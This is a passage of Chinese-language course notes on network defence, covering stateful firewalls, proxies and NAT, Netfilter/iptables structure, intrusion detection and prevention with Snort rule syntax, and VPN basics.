#### 1. 静态防火墙的弊端：

静态防火墙能够为网络提供一定的安全防护能力，然而也还存在较大的不足。

#### 2. 状态防火墙的基本思想：

 跟踪网络会话(连接)状态, 判断报文合法性

 特性: 状态报文检查(SPI: stateful packet inspection)

#### 3. 状态和基于状态的检测：

状态是特定会话在不同传输阶段所表现出来的形式和状况。

状态检测是根据连接的“状态”进行检查,只有符合状态的数据报文才会被放行。

因此，和静态包过滤防火墙相比，状态防火墙除了拥有一个规则表外，还有一个状态表。

#### 4. 状态及状态表结构

状态表结构可以用如下形式表示：

源IP地址,源端口号,目的IP地址,协议,时间戳,状态,保护标志

**协议**：指被分析的协议号，如TCP包为6，UDP包为17，ICMP包为1等。

**时间戳**：通常就是一个计时器，当到达超时，删除状态表中相应的连接。

##### (1)状态

不同的防火墙会根据用途的不同，设计出不同的状态类型，但大都是以TCP状态为基础。大部分防火墙均拥有以下四种状态：

**New**：当防火墙收到一个连接的第一个数据包时（如TCP的第一个SYN包）就会在状态表中建立一个新的表项，以便跟踪这个连接。这个新建表项的状态就为NEW。

**ESTABLISHED**：当防火墙收到一个连接的双向数据包时，状态表中的相应表项的状态就会变为ESTABLISHED。通常的情况是：当防火墙收到某个状态为NEW的连接的SYN/ACK包时，这个连接的状态就会变为ESTABLISHED。

**RELATED**：当一个ESTABLISHED连接的双方产生了与这个连接相关的连接，则这个相关连接的状态就是RELATED。这时，称ESTABLISHED状态的连接为主连接，RELATED状态的连接为相关连接。形成这个状态的关键是防火墙能够理解这些连接的相关关系。如在FTP中，FTP-DATA的连接是由FTP-CONTRL连接所产生，因此FTP-CONTRL为主连接，而FTP-DATA连接为相关连接。

**INVALID**：当到达防火墙的数据包无法被识别为属于哪个连接或没有状态时。如内存溢出，收到不属于任何一个连接的ICMP包。

一般地，遇到这样的情况时，防火墙将丢弃所有属于这个状态的数据包。

##### (2)保护标志

取1或者0，表示某些在特定时间段不能删除的连接。初始标志均为0，无需保护。

对于TCP，经过两次握手（SYN、SYN/ACK）后，防火墙将认为连接已经建立，状态变为ESTABLISHED。但是对于TCP而言，真正的连接还未建立，这是的保护标志就设为1，即使遇到网络负荷较重也要保护这个表项不被删除。

对于UDP，当在一对源/目的地址和源/目的端口间有多个数据包传输时，则认为这个连接是一种数据流，并且将保护标志设为1，即使遇到网络负荷较重也要保护这个表项不被删除。

ICMP比较特殊，只有地址没有端口，在表项中，源/目的端口和保护标志等都有特殊用途。

### 6.2.12状态检测技术的优缺点

**优点**

* 安全性比静态包过滤技术高。状态检测机制可以区分连接的发起方与接收方；可以通过状态分析阻断更多的复杂攻击行为；可以通过分析打开相应的端口而不是“一刀切”，要么全打开要么全不打开。

* 与静态包过滤技术相比，提升了防火墙的性能。状态检测机制对连接的初始报文进行详细检查，而对后续报文不需要进行相同的动作，只需快速通过即可。

**缺点**

* 主要工作在网络层和传输层，对报文的数据部分检查很少，安全性还不够高。

* 检查内容多，对防火墙的性能提出了更高的要求。

### 6.2.13 代理

代理(proxy)也是一种安全防护技术。代理技术允许客户端通过代理服务器与网络服务进行非直接的连接

#### 1. 不同类型的代理技术

**应用层**：应用层代理 (HTTP代理)

**传输层**：电路级代理 (Socks代理)

**网络层**：NAT代理 (NAT网关、拨号上网路由器)

#### 2. 应用层代理

应用层代理也称为应用层网关、代理服务器

特定应用层网络服务(HTTP/Email…)

MPS – Microsoft Proxy Server、S uid

**应用层代理优势**

隐藏内部网络信息；通讯中转，严格内容审查；存储转发机制，在线审计；用户级身份认证机制

**应用层代理不足**

不通用；不透明；处理速度较慢；部署代价较高

#### 3. 电路级代理

**电路级代理**

​	Socks代理/工作在传输层/同时为多种不同的应用服务提供支持

**工作机制**

​	TCP层中继/建立外部连接，并在连接会话间转发数据/**差异**：通用、用户级身份认证，但无法进行细致内容审查

#### 4. NAT代理

**NAT(网络地址转换)**

* 允许多个用户分享少量或单一的IP地址（源NAT）

* 允许将网络服务映射到内部服务网络IP和端口（目的NAT）

**NAT代理优势**

* 方便：任意使用私有网段IP地址，无需申请，无冲突

* 安全：对外隐藏内部网络信息

### 6.2.14 Linux中的开源防火墙

#### 1. Netfilter（Linux内核中的防火墙模块）

**Netfilter特性**

* 包过滤->状态报文检查

* 灵活可扩展框架, 支持NAT网络地址转换, 提供多层API接口以支持第三方扩展

**Netfilter**功能

* 构建防火墙, NAT共享上网, 利用NAT构建透明代理, 构建 oS或策略路由器, …

* Netfilter组成：由一系列表（Table）组成，每个表由若干个链（Chain）组成，每条链可以由一条或若干条规则（Rule）组成。

#### 2. IPTables

Linux应用层的防火墙配置工具

#### 3. 表→链→规则的分层结构

##### (1) 表

**filter表**：包过滤，有INPUT、FORWARD、OUTPUT三个链

**nat表**：地址转换，修改数据包的IP地址和端口号，有PREROUTING、POSTROUTING、OUTPUT三个链

**mangle表**：包重构，用于修改包的服务类型、生存周期以及为数据包设置Mark标记，以实现Qos（服务质量）、策略路由和网络流量整形等特殊应用。含PREROUTING、POSTROUTING、INPUT、OUTPUT和FORWARD五个链

**raw表**：数据跟踪，数据包是否被状态跟踪机制处理，有PREROUTING、OUTPUT两个链。

##### (2) 链

根据数据包流向的不同，有：

**INPUT链**: 当数据包源自外界并前往防火墙所在的本机(入站)时, 即数据包的目的地址是本机时, 则应用此链中的规则。

**OUTPUT链**: 当数据包源自防火墙所在的主机并向外发送(出站)时, 即数据包的源地址是本机时, 则应用此链中的规则。

**FORWARD链**: 当数据包源自外部系统, 并经过防火墙所在主机前往另一个外部系统(转发)时, 则应用此链中的规则。

**PREROUTING链**: 当数据包到达防火墙所在的主机在作路由选择之前, 且其源地址要被修改(源地址转换)时, 则应用此链中的规则。

**POSTROUTING链**: 当数据包在路由选择之后即将离开防火墙所在主机, 且其目的地址要被修改(目的地址转换)时, 则应用此链中的规则。

**用户自定义链**

##### (3) 规则

所谓规则实际上就是网络管理员根据安全需要而预先定义的过滤数据包的条件。

* 规则一般使用产生式进行定义，即“IF Then”方式。“如果数据包头符合这样的条件，就这样处理这个数据包”。

* 若数据包与规则匹配时，就根据规则所定义的动作来处理这些数据包（如放行、丢弃和拒绝等）。

* 配置防火墙的通过工具进行规制的添加、修改和删除。

##### (4) 顺序

* **表间的优先顺序**：raw➞mangle ➞ nat ➞ filter

* **链间的匹配顺序**：

  * 入站数据：PREROUTING➞ INPUT

  * 出站数据：OUTPUT➞ POSTROUTING

  * 转发数据：PREROUTING➞ FORWARD ➞ POSTROUTING

* **链内规则的匹配顺序**：按顺序依次进行检查，找到相匹配的规则即停止（LOG策略会有例外）。若在该链内找不到相匹配的规则，则按该链的默认策略处理

##### (5)Netfilter的运行机制

发送数据包时，数据包在协议栈中从上向下传送，每到达一层就会增加一个首部；在接受数据包时，数据包从下向上传送，每到达一层就剥离一个首部。

当一个端口（网卡）收到一个到达包时，在往协议栈的上层传递过程中也会依次剥去各层的首部。数据包在协议栈中的传送过程如下图所示：

![](https://cdn.jsdelivr.net/gh/sirosaqqara/picHosting/img/2022/05/08/143632.png)

对于收到的每个数据包，都从“A”点进来，经过路由判决，如果是发送给本机的就经过“B”点，并向协议栈的上层继续传递；否则，如果数据包的目的地是不本机，那么就经过“C”点，并经“E”点将该包转发出去。    

对于发送的每个数据包，首先也有一个路由判决，以确定该包是从哪个接口出去，然后经过“D”点，最后也是顺着“E”点将该包发送出去。

协议栈那五个关键点A，B，C，D和E就是Netfilter发挥作用的位置。

在每个关键点（称为hook点）上，有很多已经按照优先级预先注册了的回调函数(称为“钩子函数”) ，形成一条数据包分析处理链。每个到来的数据包会依次被那些回调函数进行检查和处理并根据规则决定放行或丢弃。

处理完毕，每个回调函数最后必须向Netfilter返回处理结果。每个钩子函数向Netfilter返回下列几个值其中之一：

**NF_ACCEPT**：继续正常传输数据报，即该数据包正常，可以将其传送网络协议栈的下一个阶段。

**NF_DROP**：丢弃该数据报，不再传输。

**NF_STOLEN**：告诉Netfilter“忘掉”该数据报，由回调函数将从此开始对数据包的处理，并且Netfilter应当放弃对该数据包做任何的处理，回调函数从Netfilter获取了该数据包的所有权。

**NF_QUEUE**：对该数据报进行排队(通常用于将数据报给用户空间的进程进行处理)

**NF_REPEAT**：再次调用该回调函数，应当谨慎使用这个值，以免造成死循环。



## 6.3 入侵检测基础

### 6.3.1 基本概念

#### 1. 入侵检测(Intrusion Detection)

入侵检测，顾名思义，就是对入侵行为的检测与发现。

入侵检测即为通过对计算机网络或计算机系统中若干关键点信息的收集和分析，从中发现入侵行为的一种安全技术。

#### 2. 入侵(Intrusion)

一次入侵可被定义为任何尝试破坏信息资源的保密性、完整性或可用性的行为。

#### 3. 入侵检测系统(Intrusion Detection System，IDS)

实现入侵检测技术，专门用于入侵行为发现和处理的软件系统或硬件设备。

### 6.3.2 基本技术

#### 1. 误用检测(misuse detection)

也称为基于特征的检测 (signature-based detection)

建立起已知攻击的特征库

判别当前行为活动是否符合已知的攻击特征

#### 2. 异常检测(anomaly detection)

也称为基于行为的检测 (behavior-based detection)

首先建立起系统的正常模式轮廓

若实时获得的系统或用户的轮廓值与正常值的差异超出指定的阈值，就进行入侵报警

### 6.3.3 分类

#### 1. 基于网络的入侵检测系统(NIDS)

IDS可以放在防火墙或者网关的后面，以网络嗅探器的形式捕获所有的对内对外的数据包

#### 2. 基于主机的入侵检测系统(HIDS)

检测主机系统是否受到入侵，主要以审计日志为数据源

基于内核，从操作系统的内核接收数据

基于应用，从正在运行的应用程序中收集数据

### 6.3.4 网络入侵防御系统

入侵防御系统（Intrusion Prevention System，IPS）是一种主动的、智能的入侵检测、防范、阻止系统，其设计旨在预先对入侵活动和攻击性网络流量进行拦截，避免其造成任何损失，而不是简单地在恶意流量传送时或传送后才发出警报。

IPS通常部署在网络（或被保护对象）的进出口处，当检测到攻击企图后，IPS自动地将攻击包丢掉或采取措施阻断攻击源。 

#### 1. Ips特征

嵌入式运行模式

完善的安全策略

高质量的入侵特征库

高效处理数据包的能力

强大的响应功能

#### 2. IDS与IPS的区别

**IDS: 旁路监听，只起到Detection机制**

* 侧重低漏报率，造成误报率较高

* 对使用者技术水平要求较高，应急响应及时

**IPS:串联模式，实时处置数据包**

* 侧重低误报率（对正常业务不造成影响）

* 高效的处理性能

* 即插即用，无需使用者参与

### 6.3.5 Snort网络入侵检测系统

#### 1. Snort的概述

Snort是一个开放源代码、免费、跨平台的基于规则的网络入侵保护和检测系统，支持各种形式的插件、扩充和定制，具有实时数据流量分析、对IP网络数据包进行日志记录、以及对入侵进行探测的功能。

Snort使用一种易于扩展的模块化体系结构，开发人员可以加入自己编写的模块来扩展Snort的功能，如HTTP解码插件、TCP数据流重组插件、端口扫描检测插件、FLEXRESP插件以及各种日志输入插件等。

#### 2. Snort的特点

* **Snort是一个轻量级的入侵检测系统**

Snort虽然功能强大，但是其代码极为简洁、短小。

* **Snort的跨平台性能极佳**

Snort具有跨平台的特点，它支持的操作系统广泛，包括Linux、OpenBSD 、FreeBSD 、NetBSD 、Solaris 、HP-UX 、AIX 、IRIX 、Win32（Windows 9x/NT/2000）等。

* **Snort的功能非常强大**
  * 具有实时流量分析和日志IP网络数据包的能力。
  * 能够进行协议分析，内容的搜索/匹配。
  * 日志格式既可以是Tcpdump式的二进制格式，也可以解码成ASCII字符形式。
  * 可以对TCP包进行重组。
  * 能够报告非正常的可疑包，从而对端口扫描进行有效的检测。 
  * 还有很强的系统防护能力。
* **良好的扩展性能**

Snort对于新的攻击威胁反应迅速。作为一个轻量级的网络入侵检测系统，Snort有足够的扩展能力。 Snort支持插件，可以使用具有特定功能的报告、检测子系统插件对其功能进行扩展。Snort的插件库支持包括数据库日志输出插件、碎数据包检测插件、端口扫描检测插件、HTTP URI normalization插件、XML插件等。 

* **遵循公共通用许可证GPL**

Snort遵循GNU通用公共许可证（GPL），所以任何企业、个人、组织都可以免费将其作为NIDS。

#### 3. Snort的组成

Snort由数据包解码器、检测引擎、日志与报警系统等三个重要子系统构成。

#### 4. Snort的工作模式

**嗅探器**——嗅探器模式仅仅是从网络上读取数据包并作为连续不断的流显示在终端上。

**数据包记录器**——数据包记录器模式把数据包记录到硬盘上。

**网络入侵检测系统**——网路入侵检测模式是最复杂的，而且是可配置的。用户可以让Snort分析网络数据流以匹配用户定义的一些规则，并根据检测结果采取一定的动作。

#### 5. Snort的插件机制

在Snort中运用了插件机制。插件机制具有以下一些明显的优点：

* 通过增加插件，Snort能够非常容易地增加功能，使程序具有很强的可扩展性。

* 插件机制简化了Snort的编码工作。

* 插件机制使代码功能内聚，模块行强，程序相对易读。

插件模块包括预处理插件、处理插件和输出插件3种，它们通常对应规则中的一个或几个关键字，规则匹配中遇到这些关键字时就会激活相应的插件，以完成相应的功能。

1. **预处理插件**

源文件名都以spp_开头，并在规则匹配（误用检测）之前运行，完成的功能主要分为以下几类。

模拟TCP/IP堆栈功能的插件：如IP碎片重组、TCP流重组插件。

各种解码插件：如HTTP解码插件、Unicode解码插件、RPC解码插件、Telnet协商插件等。

规则匹配无法进行攻击检测时所用的检测插件：如端口扫描插件、Spade异常入侵检测插件、Bo检测插件、Arp欺骗检测插件等

2. **处理插件**

源文件名都以sp_开头，在规则匹配阶段的ParseRuleOptions中被调用，辅助完成基于规则的匹配检测过程。

每个规则处理函数通常对应规则选项中的一个关键字，实现对这个关键字的解释或辅助解释。这些插件的主要功能如下：

协议各字段的检查，如TCPFlag，IcmpType，IcmpCode，Ttl，IpId，TcpAck，TcpSeq，Dsize，IpOption，Rpc，IcmpId，IcmpSeq，IpTos，FragBits，TcpWin，IpProto和     IpSame等。

一些辅助功能，如Respond，Priority，PatternMatch，Session，React，Reference等，这些插件分别完成响应（关闭连接）、严重级别、模式匹配（内容）、会话记录、攻击响应（高级的响应机制）、攻击参考信息等功能。

3. **输出插件**

源文件名都以spo_开头，这些插件分为日志和警告两种类型放入两个列表中，在规则匹配过程中和匹配结束之后调用，以便记录日志和警告。

以一个HTTP解码预处理器插件为例来解释插件的内部结构：

每个插件都有一个安装函数，名称为SetupXXX()，如Spp_http_decode.c：SetupHttpDecode()。

在解释规则文件时，如果检测到相应的关键字，系统就会使用规则文件中这些关键字后的字符串作为参数来调用相应的初始化函数。

在检测过程中，一旦规则匹配成功，就会触发处理函数的执行，预处理器就会在预处理过程中对数据报调用相应处理函数进行处理。

#### 6. Snort的规则

Snort规则分为两个部分：规则头和规则选项。

* 规则头包含规则的动作、协议、源地址、目的地址、子网掩码、源和目的端口信息。

* 规则选项包含报警信息以及用于确定是否触发规则响应动作而检查的数据包区域位置信息。

**规则头**

（1）规则动作

规则的头包含了定义一个包的Who，Where和What信息，以及当满足规则定义的所有属性的包出现时要采取的行动。

规则的第一项是“规则动作”（Rule Action），“规则动作”告诉Snort在发现匹配规则的包时要干什么。在Snort中有5种动作：Alert，Log，Pass，Activate和Dynamic

（2）协议

规则的第二项是协议。Snort当前分析可疑包的协议有4种：TCP，UDP，ICMP和IP，将来可能会更多，如ARP，IGRP，GRE，OSPF，RIP，IPX等

（3）IP地址

规则头的下一个部分处理一个给定规则的IP地址和端口号信息。关键字“any”可以被用来定义任何地址。

有一个操作符可以应用在IP地址上，它是否定运算符。这个操作符告诉Snort匹配除了列出的IP地址以外的所有IP地址。否定操作符用“！”表示。下面这条规则对任何来自本地网络以外的流都进行报警。

（4）端口号

端口号可以用几种方法表示，包括“any”端口、静态端口定义、范围、以及通过否定操作符。“any”端口是一个通配符，表示任何端口。静态端口定义表示一个单个端口号，例如，23表示Telnet，80表示HTTP等。端口范围用范围操作符“：”表示。 

（5）方向操作符

方向操作符“->”表示规则所施加的流的方向。方向操作符左边的IP地址和端口号被认为是流来自的源主机，方向操作符右边的IP地址和端口信息是目标主机，还有一个双向操作符“< >”，告诉Snort把地址/端口号对既作为源，又作为目标来考虑。这对于记录/分析双向对话很方便，例如，Telnet或者POP3会话 。

（6）Activate和Dynamic 规则

Activate和Dynamic规则对给了Snort更强大的能力。用户现在可以用一条规则来激活另一条规则，当这条规则适用于一些数据包时，在一些情况下这是非常有用的，例如用户想设置一条规则：当一条规则结束后来完成记录。Activate规则除了包含一个选择域：Activates外就和一条Alert规则一样。 

注意：Activate和Dynamic 规则将被Tagging 所代替。在Snort的将来版本，Activate 和Dynamic规则将完全被功能增强的Tagging所代替。

规则选项组成了Snort入侵检测引擎的核心，既易用又强大还灵活。所有的Snort规则选项用分号“；”隔开。规则选项关键字和它们的参数用冒号“：”分开。Snort中有42个规则选项关键字

**规则的语法** 

规则分类存放在规则文件中。规则文件是普通的文本文件，用户可以使用普通的文本编辑器打开进行编辑。

规则文件可以包含注释行，注释行以“#”字符开头，#号前不能有任何非空字符。 

Snort允许定义变量，并在规则中使用这些变量。变量的定义格式如下所示：

var：\<name>\<value> 

在规则中可以直接使用\$\<name>，而遇到变量名解释器就会使用\$\<value>替代\$\<name>。 

**预处理程序** 

预处理程序使得Snort的功能可以很容易地扩展，用户和程序员能够将模块化的插件方便地融入Snort之中。预处理程序代码在探测引擎被调用之前、数据包译码之后运行。通过这个机制，数据包可以通过额外的方法被修改或分析。

使用preprocessor关键字加载和配置预处理程序。

 在Snort规则文件中的preprocessor指令格式如下：`preprocessor \<name>： \<options>` 例如：preprocessor minfrag： 128

**输出插件** 

输出插件使得Snort在向用户提供格式化输出时更加灵活。输出插件在Snort的告警和记录子系统被调用时运行，在预处理程序和探测引擎之后。规则文件中指令的格式非常类似于预处理程序。

 格式：

output \<name>： \<options>

例子：

output alert_syslog：LOG_AUTH LOG_ALERT 

## 6.4 虚拟专用网基础

### 6.4.1 概述

虚拟专用网（Virtual Private Network，VPN）是指在两台计算机或两个网络之间之间建立的一条穿越公共网络的专用连接。一般地，这样的专有连接是通过隧道技术、加密和密钥管理、认证和访问控制等实现与专用网类似的安全性能，从而达到在Internet上安全传输机密数据的目的。

### 6.4.2 分类

1. 按VPN业务类型划分：

 （1）Intranet VPN（内部公文流转）

 （2）Access VPN（远程拨号VPN）

 （3）Extranet VPN（各分支机构互联）

2. 按VPN发起主体划分：

（1）客户发起，也称基于客户的VPN

（2）服务器发起，也称客户透明方式  或基于网络的VPN

3. 按隧道协议层次划分：

（1）二层隧道协议：L2F/L2TP 、PPTP

（2）三层隧道协议：GRE、IPSec

（3）介于二、三层间的隧道协议：MPLS

（4）SSL VPN

### 6.4.3应用场景

VPN通常用于以下两种种场景：远程接入和LAN-LAN 通信（外联网接入）

1. 远程接入

企业VPN允许移动用户通过因特网拨号进入它们本地的因特网服务供应商(ISP)来接入企业LAN，通常使用远程接入隧道协议，如L2TP，PPTP或L2F。

2. LAN-LAN 通信

同一组织机构的分支机构可以使用VPN来接入到组织总部的内联网。这种方式的内联网互连可以确保通信安全，且其费用相对专线连接要低得多。

### 6.4.4 VPN的安全性

一个VPN至少提供如下功能：数据加密；身份认证；访问权限控制。


